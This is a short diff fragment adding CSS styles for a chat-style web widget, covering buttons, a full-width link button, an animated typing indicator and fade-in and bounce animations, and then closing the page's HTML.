+    .chat-btn:hover, .chat-btn.solid { background: #1351B4; color: #fff; }
+    .chat-btn.wide { border-radius: 8px; text-transform: uppercase; font-size: 14px; font-weight: 700; letter-spacing: .03em; padding: 13px 20px; width: 100%; text-align: center; }
+    .chat-btn:disabled { opacity: .5; pointer-events: none; }
+    .btn-link-final {
+      display: block; width: 100%; background: #1351B4; color: #fff !important; text-decoration: none; text-align: center;
+      font-size: 14px; font-weight: 700; letter-spacing: .03em; text-transform: uppercase; border-radius: 8px; padding: 14px 16px;
+      animation: fadeUp .3s ease both;
+    }
+    .typing { display: inline-flex; align-items: center; gap: 4px; padding: 12px 16px; background: #fff; border-radius: 18px 18px 18px 4px; border: 1px solid #e5e5e5; box-shadow: 0 2px 6px rgba(0,0,0,.07); }
+    .typing span { width: 7px; height: 7px; background: #1351B4; border-radius: 50%; animation: bounce 1.2s infinite; }
+    .typing span:nth-child(2) { animation-delay: .2s; }
+    .typing span:nth-child(3) { animation-delay: .4s; }
+    @keyframes bounce { 0%,80%,100% { transform: scale(0); } 40% { transform: scale(1); } }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+  </style>
+
+</body></html>
